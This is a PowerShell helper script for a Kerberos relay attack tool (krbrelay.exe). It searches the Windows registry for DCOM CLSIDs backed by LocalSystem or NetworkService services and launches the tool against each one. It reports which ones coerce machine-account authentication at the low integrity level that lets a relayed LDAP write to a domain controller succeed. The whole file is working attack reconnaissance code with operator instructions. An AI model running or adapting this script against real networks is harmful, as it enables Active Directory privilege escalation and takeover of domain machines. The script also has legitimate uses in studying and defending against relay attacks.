# Survey DCOM triggers for a level-2 (no-integrity) coerced context.
#
# The coerced auth level is a property of the backing service, not the CLSID, but
# not every CLSID of a service triggers the coercion callback. So this groups
# CLSIDs by backing service and tries them until one coerces (prints a level),
# then moves to the next service. It covers services that run as the machine
# account (LocalSystem or NetworkService), skips disabled services, and bounds
# each probe with a timeout. It runs the probe exe with KRBRELAY_PROBE set.
#
# auth_level=2 (CONNECT, no integrity) is the one that makes the direct-kerberos
# post-bind write work. auth_level=5/6 (packet integrity/privacy) blocks it.
#
# Run in the SAME operator session where a direct exe run coerces. In a session-0
# shell the activation returns E_NOINTERFACE and nothing coerces.
#
#   .\survey_triggers.ps1 -Exe .\krbrelay.exe
#
param(
    [string]$Exe = ".\krbrelay.exe",
    [string]$Spn = "ldap/dc.mayyhem.com",
    [int]$TimeoutSec = 8
)

$env:KRBRELAY_PROBE = "1"
$Exe = (Resolve-Path $Exe).Path

# AppID -> service name, for AppIDs that name a local service.
$appidToSvc = @{}
Get-ChildItem 'HKLM:\SOFTWARE\Classes\AppID' -ErrorAction SilentlyContinue | ForEach-Object {
    $ls = (Get-ItemProperty $_.PSPath -Name 'LocalService' -ErrorAction SilentlyContinue).LocalService
    if ($ls) { $appidToSvc[$_.PSChildName.ToUpper()] = $ls }
}

# Services that run as the machine account and are not disabled. LocalSystem and
# NetworkService both authenticate as the computer account. LocalService is
# anonymous, so it is excluded.
$svcInfo = @{}
Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
    $machine = ($_.StartName -eq 'LocalSystem') -or ($_.StartName -like '*NetworkService')
    if ($machine -and $_.StartMode -ne 'Disabled') {
        $svcInfo[$_.Name.ToLower()] = @{ Mode = $_.StartMode; Account = $_.StartName }
    }
}

# All CLSIDs grouped by backing service.
$svcToClsids = @{}
Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | ForEach-Object {
    $appid = (Get-ItemProperty $_.PSPath -Name 'AppID' -ErrorAction SilentlyContinue).AppID
    if ($appid -and $appidToSvc.ContainsKey($appid.ToUpper())) {
        $svc = $appidToSvc[$appid.ToUpper()].ToLower()
        if ($svcInfo.ContainsKey($svc)) {
            if (-not $svcToClsids.ContainsKey($svc)) { $svcToClsids[$svc] = @() }
            $svcToClsids[$svc] += $_.PSChildName
        }
    }
}

Write-Host ("[*] {0} candidate services (LocalSystem/NetworkService, not disabled)" -f $svcToClsids.Count)
$tmp = [System.IO.Path]::GetTempFileName()
$err = "$tmp.err"
foreach ($svc in ($svcToClsids.Keys | Sort-Object)) {
    $acct = $svcInfo[$svc].Account
    $mode = $svcInfo[$svc].Mode
    $result = ""
    $usedClsid = ""
    foreach ($clsid in $svcToClsids[$svc]) {
        $usedClsid = $clsid
        $p = Start-Process -FilePath $Exe `
            -ArgumentList @('127.0.0.1', '9999', $Spn, '127.0.0.1', '7989', $clsid) `
            -NoNewWindow -PassThru -RedirectStandardOutput $tmp -RedirectStandardError $err
        if (-not $p.WaitForExit($TimeoutSec * 1000)) { try { $p.Kill() } catch {}; $result = "TIMEOUT"; continue }
        $out = ((Get-Content $tmp, $err -ErrorAction SilentlyContinue) -join "`n")
        $probe = (($out -split "`r?`n") | Where-Object { $_ -match '\[probe\]' }) -join ' '
        if ($probe) { $result = $probe.Trim(); break }
        $result = ((($out -split "`r?`n") | Where-Object { $_ -match 'stage' }) -join ' ').Trim()
    }
    "{0}  svc={1} acct={2} start={3}  => {4}" -f $usedClsid, $svc, $acct, $mode, $result
}
Remove-Item $tmp, $err -ErrorAction SilentlyContinue
